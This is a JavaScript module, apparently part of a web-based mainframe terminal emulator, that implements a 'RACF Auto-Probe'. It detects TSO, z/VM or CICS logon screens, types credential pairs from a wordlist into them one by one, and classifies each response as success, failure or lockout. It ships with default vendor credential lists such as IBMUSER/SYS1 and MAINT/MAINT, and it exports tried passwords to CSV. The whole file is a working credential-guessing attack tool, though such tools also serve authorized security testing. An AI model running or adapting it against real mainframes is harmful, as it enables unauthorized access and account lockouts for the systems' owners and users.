'use strict';

// RACF Auto-Probe — Wave 7
// Detects the current subsystem (TSO, z/VM, CICS) from the live screen,
// iterates a credential wordlist, and classifies each response as
// SUCCESS, FAILURE, or LOCKOUT.  Stops immediately on lockout or success.

const _PROBE_PROFILES = {
  TSO: {
    detect:  t => /TSO\/E LOGON|ENTER USERID|TSO LOGON/i.test(t),
    userRow: 5, userCol: 15,
    passRow: 6, passCol: 15,
    success: t => /\bREADY\b|ISPF PRIMARY|ICH70002I/i.test(t),
    lockout: t => /IKJ56421I|AUTHORIZATION FAILURE|REVOKED/i.test(t),
    logon:   t => /TSO\/E LOGON|ENTER USERID/i.test(t),
    defaults: [
      'IBMUSER,SYS1', 'IBMUSER,IBMUSER', 'MAINT,MAINT', 'MAINT,SYS1',
      'SYSPROG,SYSPROG', 'SYSADM,SYSADM', 'TSTADMIN,TSTADMIN',
      'BATCH,BATCH', 'CICS,CICS', 'DB2,DB2', 'MQ,MQ',
    ],
  },
  ZVM: {
    detect:  t => /z\/VM|CP LOGON|USERID\s*==>/i.test(t),
    userRow: 9,  userCol: 14,
    passRow: 10, passCol: 14,
    success: t => /LOGON AT|CMS READY|CP READ|Ready;/i.test(t),
    lockout: t => /revoked|suspended|not authorized to log on/i.test(t),
    logon:   t => /z\/VM|USERID\s*==>/i.test(t),
    defaults: [
      'OPERATOR,OPERATOR', 'MAINT,MAINT', 'MAINT730,MAINT730',
      'PMAINT,PMAINT', 'TCPMAINT,TCPMAINT', 'AUTOLOG1,AUTOLOG1',
    ],
  },
  CICS: {
    detect:  t => /CESN|SIGN ON TO CICS|CICS.*SIGNON/i.test(t),
    userRow: 5, userCol: 25,
    passRow: 6, passCol: 25,
    success: t => /DFH\w{4} SIGNON|CICS APPLICATION/i.test(t),
    lockout: t => /revoked|AEIS|user.*lock|account.*lock/i.test(t),
    logon:   t => /CESN|SIGN ON TO CICS/i.test(t),
    defaults: [
      'CICSUSER,CICSUSER', 'CICS,CICS', 'ADMIN,ADMIN',
      'IBMUSER,SYS1', 'SYSADM,SYSADM',
    ],
  },
};

let _probeRunning  = false;
let _probeAborted  = false;
let _probeResults  = [];
let _probeScreenCb = null;

// Called from handleBridgeMsg (profiles.js) every time a 'screen' message
// arrives for the active session.
function probeOnScreen(msg) {
  if (_probeScreenCb) {
    const cb = _probeScreenCb;
    _probeScreenCb = null;
    cb(msg);
  }
}

function _probeWaitScreen(ms = 8000) {
  return new Promise((resolve, reject) => {
    const t = setTimeout(() => { _probeScreenCb = null; reject(new Error('timeout')); }, ms);
    _probeScreenCb = msg => { clearTimeout(t); resolve(msg); };
  });
}

function _probeText(msg) {
  if (!msg || !msg.rows) return '';
  return msg.rows.map(r => r.map(c => c.char || ' ').join('')).join('\n');
}

function _probeSend(obj) {
  const s = sessions.get(activeSession);
  if (!s || s.ws.readyState !== WebSocket.OPEN) throw new Error('No active session');
  s.ws.send(JSON.stringify(obj));
}

function _probeSetStatus(msg) {
  const el = document.getElementById('probeStatus');
  if (el) el.textContent = msg;
}

function probeDetectSubsystem() {
  const txt = liveScreenText || '';
  for (const [name, p] of Object.entries(_PROBE_PROFILES)) {
    if (p.detect(txt)) return { name, profile: p };
  }
  // Fallback: OIA APP field
  const app = (document.getElementById('oiaApp') || {}).textContent || '';
  if (_PROBE_PROFILES[app.trim().toUpperCase()]) {
    const name = app.trim().toUpperCase();
    return { name, profile: _PROBE_PROFILES[name] };
  }
  return null;
}

function probeLoadDefaults() {
  const det = probeDetectSubsystem();
  const el  = document.getElementById('probeWordlist');
  if (!el) return;
  if (det) {
    el.value = det.profile.defaults.join('\n');
    _probeSetStatus(`Defaults loaded for ${det.name} — ${det.profile.defaults.length} pairs`);
  } else {
    _probeSetStatus('Navigate to a TSO, z/VM, or CICS logon screen first');
  }
}

async function startProbe() {
  if (_probeRunning) return;

  const det = probeDetectSubsystem();
  if (!det) { _probeSetStatus('Navigate to a TSO, z/VM, or CICS logon screen first'); return; }
  const { name: sysName, profile } = det;

  const delay = parseInt((document.getElementById('probeDelay') || {}).value || '1500', 10) || 1500;
  const raw   = (document.getElementById('probeWordlist') || {}).value || '';
  const pairs = raw.split('\n')
    .map(l => l.trim()).filter(l => l && !l.startsWith('#'))
    .map(l => { const [u, p] = l.split(',').map(s => s.trim()); return u && p ? [u, p] : null; })
    .filter(Boolean);

  if (!pairs.length) { _probeSetStatus('Add credentials in USERID,PASSWORD format'); return; }

  _probeRunning = true;
  _probeAborted = false;
  _probeResults = [];
  _probeRenderResults();

  document.getElementById('probeStartBtn').style.display = 'none';
  document.getElementById('probeStopBtn').style.display  = '';
  _probeSetStatus(`Probing ${sysName} — ${pairs.length} pair(s)`);

  for (let i = 0; i < pairs.length; i++) {
    if (_probeAborted) break;
    const [userid, password] = pairs[i];
    _probeSetStatus(`[${i + 1}/${pairs.length}] Trying ${userid} / ${'•'.repeat(password.length)}`);

    try {
      _probeSend({ type: 'type', row: profile.userRow, col: profile.userCol, text: userid   });
      _probeSend({ type: 'type', row: profile.passRow, col: profile.passCol, text: password });
      await new Promise(r => setTimeout(r, 150));
      _probeSend({ type: 'key', aid: 'ENTER', fields: [] });

      const screen = await _probeWaitScreen(8000);
      const txt    = _probeText(screen);

      let result;
      if      (profile.lockout(txt)) result = 'LOCKOUT';
      else if (profile.success(txt)) result = 'SUCCESS';
      else                           result = 'FAILURE';

      _probeResults.push({ userid, password, result, ts: new Date().toISOString() });
      _probeRenderResults();

      if (result === 'LOCKOUT') { _probeSetStatus(`🔴 LOCKOUT — ${userid} is locked. Stopped.`); break; }
      if (result === 'SUCCESS') { _probeSetStatus(`✅ SUCCESS — ${userid}`); break; }

      // Wait for logon screen to redisplay before next attempt
      if (i < pairs.length - 1 && !_probeAborted) {
        await new Promise(r => setTimeout(r, delay));
        try { await _probeWaitScreen(4000); } catch { /* timeout ok — logon may already be showing */ }
      }

    } catch (err) {
      _probeResults.push({ userid, password, result: 'ERR', ts: new Date().toISOString() });
      _probeRenderResults();
      _probeSetStatus('Error: ' + err.message);
      break;
    }
  }

  _probeRunning = false;
  document.getElementById('probeStartBtn').style.display = '';
  document.getElementById('probeStopBtn').style.display  = 'none';

  const last = _probeResults[_probeResults.length - 1];
  if (!_probeAborted && last && !['SUCCESS', 'LOCKOUT'].includes(last.result)) {
    _probeSetStatus(`Done — ${_probeResults.length} attempt(s), no match found`);
  }
}

function stopProbe() {
  _probeAborted  = true;
  _probeRunning  = false;
  _probeScreenCb = null;
  _probeSetStatus('Stopped');
  document.getElementById('probeStartBtn').style.display = '';
  document.getElementById('probeStopBtn').style.display  = 'none';
}

function probeExportCsv() {
  if (!_probeResults.length) return;
  const rows = [
    ['userid', 'password', 'result', 'timestamp'],
    ..._probeResults.map(r => [r.userid, r.password, r.result, r.ts]),
  ];
  const csv  = rows.map(r => r.map(v => `"${String(v).replace(/"/g, '""')}"`).join(',')).join('\n');
  const blob = new Blob([csv], { type: 'text/csv' });
  saveAs(blob, `racf-probe-${new Date().toISOString().slice(0, 19).replace(/:/g, '-')}.csv`);
}

function _probeRenderResults() {
  const el = document.getElementById('probeResultsTable');
  if (!el) return;
  if (!_probeResults.length) { el.innerHTML = ''; return; }
  const C = { SUCCESS: '#3a9a6a', LOCKOUT: '#e06060', FAILURE: '#555', ERR: '#e0a060' };
  el.innerHTML =
    '<table style="width:100%;border-collapse:collapse;font-size:10px;margin-top:4px">' +
    '<tr style="color:var(--text-muted)"><th style="text-align:left;padding:2px 4px;font-weight:normal">USERID</th>' +
    '<th style="text-align:left;padding:2px 4px;font-weight:normal">PASS</th>' +
    '<th style="text-align:left;padding:2px 4px;font-weight:normal">RESULT</th></tr>' +
    _probeResults.map(r => {
      const c = C[r.result] || '#777';
      return `<tr>` +
        `<td style="padding:2px 4px;color:#aaa;font-family:'IBM Plex Mono',monospace">${esc(r.userid)}</td>` +
        `<td style="padding:2px 4px;color:#444;font-family:'IBM Plex Mono',monospace">${'•'.repeat(Math.min(r.password.length, 8))}</td>` +
        `<td style="padding:2px 4px;color:${c};font-weight:700">${esc(r.result)}</td></tr>`;
    }).join('') + '</table>';
}
